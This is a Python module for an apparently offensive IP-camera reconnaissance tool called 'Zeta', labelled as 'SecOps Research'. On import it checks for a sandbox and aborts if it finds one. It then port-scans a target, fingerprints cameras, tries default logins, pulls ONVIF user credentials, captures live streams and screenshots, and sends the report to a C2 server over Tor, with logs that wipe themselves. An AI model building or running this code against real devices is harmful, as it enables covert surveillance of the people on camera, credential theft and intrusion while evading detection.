# surveillance_recon/core/__init__.py
# [SecOps Research // Core Module Interface v2.1]
# Unified API for Zeta reconnaissance engine. All modules auto-integrated and context-aware.

from typing import Dict, Any
from surveillance_recon.utils.evasion import SandboxDetector
from surveillance_recon.utils.logger import SecureLogger
from surveillance_recon.utils.helpers import is_valid_ip, expand_ip_range, get_geo_info
from surveillance_recon.core.scanner import PortScanner
from surveillance_recon.core.fingerprinter import CameraFingerprinter
from surveillance_recon.core.authenticator import Authenticator
from surveillance_recon.core.streamer import StreamValidator
from surveillance_recon.core.exfil import DataExfiltrator

# Auto-trigger evasion on module import (first line of defense)
SandboxDetector().abort_if_sandboxed()

class ReconEngine:
    """
    High-level orchestration engine that ties all core modules into a single operational flow.
    Designed for both CLI and programmatic use.
    """

    def __init__(
        self,
        target_ip: str,
        port_range: list = None,
        c2_onion: str = None,
        c2_https: str = None,
        use_tor: bool = True,
        auto_wipe_logs: bool = True,
        console_output: bool = True
    ):
        if not is_valid_ip(target_ip):
            raise ValueError("Invalid target IP address")

        self.target_ip = target_ip
        self.port_range = port_range
        self.c2_onion = c2_onion
        self.c2_https = c2_https
        self.use_tor = use_tor
        self.report = {
            "target_ip": target_ip,
            "scan_time": None,
            "geo": get_geo_info(target_ip),
            "open_ports": [],
            "services": [],
            "camera_candidates": [],
            "auth_results": {},
            "streams": [],
            "vulnerabilities": [],
            "is_exploit_ready": False,
            "session_id": f"zeta_{target_ip.replace('.', '_')}"
        }

        # Initialize logger early
        self.logger = SecureLogger(
            target_ip=target_ip,
            log_dir="zeta_logs",
            encrypt=True,
            auto_wipe=auto_wipe_logs,
            console_output=console_output
        )

        # Initialize exfil if C2 provided
        self.exfil_engine = None
        if c2_onion or c2_https:
            self.exfil_engine = DataExfiltrator(
                c2_onion=c2_onion or "http://dummy.onion",
                c2_https=c2_https,
                use_tor=use_tor
            )

    def run_full_recon(self) -> Dict[str, Any]:
        """
        Execute full Zeta reconnaissance sequence:
        1. Port scan
        2. Service fingerprinting
        3. Default credential testing
        4. Stream validation
        5. Report aggregation
        6. Optional exfiltration
        """
        import time
        start_time = time.time()
        self.logger.info(f"Starting full reconnaissance on {self.target_ip}")

        # Step 1: Port scan
        scanner = PortScanner(
            target_ip=self.target_ip,
            timeout=4.0,
            max_workers=80,
            jitter=True
        )
        raw_results = scanner.scan(self.port_range)
        self.report["open_ports"] = [r["port"] for r in raw_results]
        self.report["services"] = raw_results
        self.logger.data("open_ports", self.report["open_ports"])

        # Step 2: Fingerprint camera candidates
        high_value = scanner.get_high_value_ports()
        for svc in high_value:
            port = svc["port"]
            try:
                fp = CameraFingerprinter(self.target_ip, port, timeout=6)
                fp_result = fp.fingerprint()
                fp_result["port"] = port
                self.report["camera_candidates"].append(fp_result)

                # Aggregate vulnerabilities
                if fp_result.get("vulnerabilities"):
                    self.report["vulnerabilities"].extend(fp_result["vulnerabilities"])
                if fp_result.get("is_exploit_ready"):
                    self.report["is_exploit_ready"] = True

                self.logger.success(f"Camera detected on port {port}: {fp_result.get('brand', 'Unknown')}")
            except Exception as e:
                self.logger.warn(f"Fingerprinting failed on port {port}: {e}")

        # Step 3: Test default credentials
        for candidate in self.report["camera_candidates"]:
            port = candidate["port"]
            brand = candidate.get("brand", "generic")
            try:
                auth = Authenticator(
                    target_ip=self.target_ip,
                    port=port,
                    brand=brand,
                    timeout=8,
                    delay_range=(1.8, 3.2)
                )
                # Fetch login page HTML
                import requests
                try:
                    login_html = requests.get(f"http://{self.target_ip}:{port}/", timeout=5, verify=False).text
                except:
                    login_html = ""
                auth_result = auth.test_default_credentials(login_html)
                if auth_result:
                    self.report["auth_results"][port] = {
                        "credentials": {"username": auth_result[0], "password": auth_result[1]},
                        "login_url": auth_result[2]
                    }
                    self.logger.success(f"Default credentials work on port {port}: {auth_result[0]}/{auth_result[1]}")

                    # Extract ONVIF users if auth succeeded
                    onvif_users = auth.extract_onvif_credentials()
                    if onvif_users:
                        candidate["onvif_users"] = onvif_users
                        self.logger.data("onvif_users", [u["username"] for u in onvif_users])
            except Exception as e:
                self.logger.warn(f"Auth testing failed on port {port}: {e}")

        # Step 4: Validate live streams
        for candidate in self.report["camera_candidates"]:
            port = candidate["port"]
            brand = candidate.get("brand", "generic")
            auth_tuple = None
            if port in self.report["auth_results"]:
                creds = self.report["auth_results"][port]["credentials"]
                auth_tuple = (creds["username"], creds["password"])

            try:
                streamer = StreamValidator(
                    target_ip=self.target_ip,
                    port=port,
                    auth=auth_tuple,
                    capture_dir="zeta_screenshots"
                )
                streams = streamer.detect_streams(brand=brand)
                if streams:
                    self.report["streams"].extend(streams)
                    for s in streams:
                        self.logger.success(f"Live stream found: {s['playable_url']}")
            except Exception as e:
                self.logger.warn(f"Stream validation failed on port {port}: {e}")

        # Finalize report
        self.report["scan_time"] = time.time() - start_time
        self.logger.success("Full reconnaissance completed")

        # Step 5: Exfiltrate if C2 configured
        if self.exfil_engine:
            self.exfil_engine.exfil(self.report, persistent=False)
            self.logger.info("Report exfiltrated to Zeta C2")

        # Step 6: Save local encrypted report
        self.logger.save_full_report(self.report)

        return self.report

    def get_report(self) -> Dict[str, Any]:
        return self.report.copy()

# Public API exports
__all__ = [
    "PortScanner",
    "CameraFingerprinter",
    "Authenticator",
    "StreamValidator",
    "DataExfiltrator",
    "ReconEngine"
]
